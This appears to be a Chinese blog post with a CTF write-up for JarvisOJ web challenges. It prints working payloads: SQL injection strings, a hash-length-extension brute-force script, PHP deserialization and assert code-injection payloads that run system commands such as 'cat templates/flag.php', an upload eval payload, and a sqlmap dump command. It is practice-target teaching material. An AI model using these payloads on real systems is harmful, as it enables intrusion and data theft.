---
layout:     post                    # 使用的布局（不需要改）
title:      JarvisOJ-WEB-Writeup    # 标题
subtitle:   一只 web 狗在成长        #副标题
date:       2018-09-15              # 时间
author:     RTL                     # 作者
header-img: img/post-bg-hacker.jpg  #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
  - CTF
  - Writeup
---

# JarvisOJ-WEB-Writeup

## PORT51

- [题目地址](http://web.jarvisoj.com:32770/)

- curl 可以指定使用本地端口来访问 [curl可添加的参数](https://fmhelp.filemaker.com/help/16/fmp/zh/index.html#page/FMP_Help/curl-options.html)
- ![port51](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-PORT51.png?raw=true)

## Localhost

- [题目地址](http://web.jarvisoj.com:32774/)

- 了解一下 request 中的 x-forwarded-for 参数
- ![localhost](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-localhost.png?raw=true)

## Login

- [题目地址](http://web.jarvisoj.com:32772/)

- 随便发了个请求，发现了一个hint
- ![login](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Login.png?raw=true)
- sql注入问题，但是有md5，这该怎么构造呢，一开始想直接闭合括号，但是php不管输入什么字符串，由于没有..连接，都会优先执行md5()，所以网上搜到了一篇[博客](https://blog.csdn.net/greyfreedom/article/details/45846137)

- 学到了 ffifdyop 是个 nb 字符串
- ![loginflag](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-LoginFlag.png?raw=true)

## 神盾局的秘密

- [题目地址](http://web.jarvisoj.com:32768/)

- 打开，加载好慢...
- 抓包，发现图片 src 的 get 参数 ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-1.png?raw=true)
- base64解码 "c2hpZWxkLmpwZw==" -> "shield.jpg"
- 尝试查看 index.php ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-2.png?raw=true)
- 发现了 shield.php 转码后查看 ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-3.png?raw=true)
- 与 index.php 同时查看后使用以下代码构造 payload

```php
<?php
  class Shield {
    public $file = "pctf.php";
  }
  $chybeta = new Shield();
  print_r(serialize($chybeta));
  ?>
```

- 得到 flag ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-4.png?raw=true)

## In A Mass

- 习惯性的查看页面源代码 发现源码在 index.phps 里

```php
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
  header('Location: index.php?id=1');
  exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
  echo 'Hahahahahaha';
  return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
  require("flag.txt");
}
else
{
  print "work harder!harder!harder!";
}
?>
```

- 分析一波，id 需要等于0，但是需要直接等于 0 会在第一个 if 出问题，所以使用十六进制 0x0
- a 的话，本想使用 ssrf来访问，但是捣鼓半天发不出请求，所以使用 php 伪协议 a=php://input，将内容写在post里
- b eregi 函数可以使用 %00 中断，而 strlen 不会
- 构造 payload "web.jarvisoj.com:32780?id=0x0&a=php://input&b=%0011111"
- ![inamass](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-InAMass-1.png?raw=true)

- web.jarvisoj.com:32780/^HT2mCpcvOLf  hi666? 猜测是 sql 注入
- 过滤了空格、关键词，但是难住我吗？确实难住了，查了一波资料，构造 payload
- ![inamass](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-InAMass.png?raw=true)

## RE

- 很迷...没想到是 mysql 的函数库
- ![re?](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-RE.png?raw=true)

## flag 在管理员手中

- burp 拦截，发现 ![flaginadmin](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-FlagInAdmin-1.png?raw=true)
- 扫一下目录，发现 index.php~
- 尝试打开失败，linux 下 file 发现是 vim 文件， recover ![flaginadmin](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-FlagInAdmin-2.png?raw=true)

```php
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
  body {
    background:gray;
    text-align:center;
  }
</style>
</head>

<body>
  <?php
  $auth = false;
  $role = "guest";
  $salt =
  if (isset($_COOKIE["role"])) {
    $role = unserialize($_COOKIE["role"]);
    $hsh = $_COOKIE["hsh"];
    if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
      $auth = true;
    } else {
      $auth = false;
    }
  } else {
    $s = serialize($role);
    setcookie('role',$s);
    $hsh = md5($salt.strrev($s));
    setcookie('hsh',$hsh);
  }
  if ($auth) {
    echo "<h3>Welcome Admin. Your flag is";
  } else {
    echo "<h3>Only Admin can see the flag!!</h3>";
  }
?>

</body>
</html>

```

- 这是？[哈希拓展攻击](https://danaive.github.io/2016/12/06/0x01/)...
- salt 长度不知道哇
- 对于密码学我还是懵逼的，网上搜到了脚本
- 安装 hash_extender

```shell
git clone https://github.com/iagox86/hash_extender  
cd hash_extender  
make
```

```py
# -*- coding:utf-8 -*-
from urlparse import urlparse
from httplib import HTTPConnection
from urllib import urlencode
import json
import time
import os
import urllib

def gao(x, y):
      #print x
      #print y
  url = "http://web.jarvisoj.com:32778/index.php"
  cookie = "role=" + x + "; hsh=" + y
      #print cookie
  build_header = {
    'Cookie': cookie,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0',
    'Host': 'web.jarvisoj.com:32778',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  }
  urlparts = urlparse(url)
  conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
  conn.request("GET", urlparts.path, '', build_header)
  resp = conn.getresponse()
  body = resp.read()
  return body

for i in xrange(1000):
  print i
  # secret len = ???
  find_hash = "./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet"
  #print find_hash
  calc_res = os.popen(find_hash).readlines()
  hash_value = calc_res[0][:32]
  attack_padding = calc_res[0][32:]
  attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
  ret = gao(attack_padding, hash_value)
  if "Welcome" in ret:
    print ret
    break
```

## Chopper

- 题目环境配置有问题

## Easy Gallery

- 上传图片完毕后，使用 view 查看，发现了 src ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-1.png?raw=true) ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-2.png?raw=true)

- 那如何可以将其解析为 php 呢？查看 url 发现了问题 ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-3.png?raw=true)
- 猜测可以在图片中加上 php 代码 ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-4.png?raw=true)
- 发现被过滤了？ ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-5.png?raw=true)
- 谷歌寻找了一下方法，构造 payload 

```html
<script language="php">@eval(system('ls'));</script>
```

- 得到 flag ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-6.png?raw=true)

## Simple Injection

- 直接 sqlmap 跑  

```shell
python sqlmap.py -u http://web.jarvisoj.com:32787/login.php --data="username=admin&password=admin" --tamper=space2comment -D injection --dump
```

- 得到后 md5 解密 334cfb59c9d74849801d5acdcfdaadc3 -> eTAloCrEP
- ![simpleinjection](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-SimpleInjection.png?raw=true)

## api 调用

- 分析一波源码，感觉可以 XEE 注入 ![api](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-API.png?raw=true)
- 直接得到 flag ![api](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-API-1.png?raw=true)

## 图片上传漏洞

- 这题被搅屎了
- 漏洞的话参考 [ImageMagick 命令执行分析](https://www.2cto.com/article/201605/505823.html)

## phpinfo

- 这个漏洞在这篇文章内有说 [传送门](http://www.91ri.org/15925.html)
- 理解了这个漏洞就很容易了
- 构造上传与反序列化

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
  <input type="file" name="file" />
  <input type="submit" />
</form>
```

```php
<?php
class OowoO
{
    public $mdzz='?';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

- 将问号替换为需要执行的 php 代码
- 想使用 system 命令，但是失败了，应该是被禁用了？
- 所以构造 payload : print_r(scandir(dirname(__FILE__)));
- 序列化后: O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
- 为了防止转义，将 " 前加上 \ ，并且开头加上 | (session格式):" |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";} "

- ![phpinfo](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-phpinfo-1.png?raw=true)
- 接下来读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php，由 phpinfo 可知，当前目录为/opt/lampp/htdocs/
- 所以，构造 payload: |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
- ![phpinfo](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-phpinfo-2.png?raw=true)

## WEB?

- 打开网页，查看源码，发现 app.js ![web?](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-WEB-1.png?raw=true)
- 因为全靠渲染来完成，所以查找错误时的 "wrong password!!" ![web?](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-WEB-2.png?raw=true)
- 可知判断由 checkpass 完成，查找 ![web?](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-WEB-3.png?raw=true)
- 继续查找，得到以下函数

```js
if (25 !== e.length) return !1;
  for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));
  for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [
      [11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135],
      [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221],
      [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230],
      [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80],
      [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45],
      [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107],
      [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249],
      [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158],
      [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98],
      [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141],
      [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119],
      [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94],
      [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208],
      [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196],
      [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40],
      [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123],
      [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236],
      [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119],
      [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196],
      [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66],
      [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214],
      [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212],
      [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235],
      [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156],
      [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]
    ], n = 0; n < 25; n++) {
    for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];
    if (i !== r[n]) return !1
  }
  return !0
```

- 易知，解方程组即可解出 flag，附上脚本

```py
# -*- coding:utf8 -*-

import sympy
from scipy.linalg import solve

if __name__ == "__main__":
  r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444,
      373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]
  o = [
        [11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225,
            193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135],
        [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67,
            19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221],
        [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52,
            228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230],
        [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174,
            236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80],
        [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170,
            78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45],
        [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236,
            111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107],
        [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165,
            206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249],
        [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157,
            160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158],
        [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245,
            133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98],
        [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225,
            85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141],
        [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255,
            101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119],
        [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121,
            56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94],
        [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97,
            256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208],
        [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104,
            107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196],
        [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224,
            237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40],
        [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146,
            78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123],
        [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155,
            88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236],
        [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166,
            130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119],
        [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20,
            133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196],
        [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214,
            168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66],
        [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238,
            248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214],
        [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105,
            178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212],
        [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47,
            212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235],
        [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28,
            88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156],
        [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13,
            143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]
      ]
  x = solve(o, r)
  flag = ''
  for i in range(len(x)):
    flag += chr(int(round(x[i])))
  print flag

```

## [61dctf]admin

- 签到题
- 扫目录，发现 robots.txt，访问，给了地址 /admin_s3cr3t.php
- 访问抓包， cookie: admin=0，改为 1 获得 flag

## [61dctf]inject

- 扫目录，在 index.php~ 中发现源码泄漏

```php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

- mysql 中反引号与单引号区别
  - 反引号是为了区分MySQL的保留字与普通字符而引入的符号
  - create table desc 报错
  - create table `desc` 成功
  - 一般我们建表时都会将表名，库名都加上反引号来保证语句的执行度。
- 该题为了考察 在使 "desc `secret_{$table}`" 成功执行下完成注入
- 本地测试，desc `test` `sth`，当前者表存在时，不报错，所以构造 payload
- test`%20`union%20select%20SCHEMA_NAME%20from%20information_schema.SCHEMATA%20limit%201,1
- test`%20`union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x363164333030 limit 1,1
- test`%20`union select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x7365637265745f666c6167 limit 1,1
- test`%20`union select flagUwillNeverKnow from secret_flag limit 1,1

## [61dctf]babyphp

- 在 about 中看到使用了 Git，猜测存在 .git 源码泄漏，GitHack 拉一下源码
- 在 index.php 中查看到 assert，存在 assert 任意代码执行漏洞

```php
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```

- 直接构造 payload: page=','..') or die(system('cat templates/flag.php'));//

## [661dctf]register

- sql 注入还没学好，二次注入暂时还不明白，之后回来补锅。

## [61dctf]babyxss

- payload 一直存在问题，在此只放一个验证码脚本吧

```py
import random
import string

def md5(str):
  import hashlib
  m = hashlib.md5()
  m.update(str)
  return m.hexdigest()

while 1:
  row = raw_input("prefix: ")
  while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890', 4))
    if md5(s)[0:4] == row:
      print s
      break

```